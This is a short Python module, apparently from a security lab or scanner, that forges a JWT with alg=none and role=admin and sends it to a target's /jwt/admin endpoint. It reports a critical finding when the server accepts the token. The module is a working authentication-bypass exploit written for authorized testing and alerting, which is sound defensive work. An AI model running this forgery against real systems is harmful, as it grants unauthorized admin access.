"""JWT attack module (authorized lab use only).

Demonstrates the classic `alg=none` forgery: an attacker swaps the algorithm to "none", strips
the signature, sets ``role=admin`` and a broken verifier trusts it. Findings are reported as
`vuln_finding` events (type ``jwt_alg_none``) so the SOC raises a ``vuln-jwt_alg_none`` alert.
"""
from typing import Dict, List

import requests
from aegis_crypto import jwt_tokens


def _finding(ftype: str, url: str, evidence: str, severity: str = "critical") -> Dict:
    return {
        "type": ftype, "url": url, "param": "Authorization",
        "payload": "alg=none role=admin", "evidence": evidence, "severity": severity,
        "tactic": "Credential Access", "technique": "T1550.001",
    }


def run(base_url: str, timeout: float = 5.0) -> List[Dict]:
    base = base_url.rstrip("/")
    findings: List[Dict] = []
    forged = jwt_tokens.forge_alg_none({"sub": "attacker", "role": "admin"})
    headers = {"Authorization": "Bearer " + forged}

    # Vulnerable endpoint: a verifier that skips signature checks trusts the forged admin claim.
    try:
        r = requests.get(base + "/jwt/admin", headers=headers, timeout=timeout)
        if r.status_code == 200 and "secret" in r.text.lower():
            findings.append(_finding(
                "jwt_alg_none", base + "/jwt/admin",
                "alg=none forged token granted admin access (signature not verified)",
            ))
    except requests.RequestException:
        pass

    return findings
